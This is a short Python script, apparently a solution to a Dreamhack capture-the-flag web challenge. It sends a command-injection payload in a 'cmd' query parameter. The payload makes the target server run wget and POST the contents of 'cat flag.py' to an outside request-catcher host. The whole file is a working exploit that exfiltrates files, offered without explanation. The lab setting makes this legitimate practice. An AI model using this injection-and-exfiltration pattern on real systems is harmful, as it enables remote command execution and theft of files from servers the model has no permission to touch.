import requests

port = 12108
url_index = f"http://host3.dreamhack.games:{port}/"
cmd = 'wget https://xrtpwmw.request.dreamhack.games --method=POST --body-data="`cat flag.py`"'

r = requests.head(url_index + f"?cmd={cmd}")
print(r.text)
